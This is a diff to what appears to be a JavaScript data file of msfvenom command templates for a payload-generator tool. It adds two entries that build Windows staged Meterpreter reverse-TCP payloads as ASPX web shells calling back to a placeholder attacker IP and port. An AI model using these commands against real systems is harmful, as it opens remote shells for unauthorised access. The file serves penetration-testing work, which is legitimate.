@@ -445,6 +445,16 @@ const msfvenomCommands =  withCommandType(
             "meta": ["msfvenom", "windows", "staged", "reverse"]
         },
         {
+            "name": "Windows Staged ASPX Reverse TCP",
+            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+            "meta": ["msfvenom", "windows", "staged", "reverse"]
+        },
+        {
+            "name": "Windows Staged ASPX Reverse TCP (x64)",
+            "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
+            "meta": ["msfvenom", "windows", "staged", "reverse"]
+        },
+        {
             "name": "Linux Meterpreter Staged Reverse TCP (x64)",
             "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
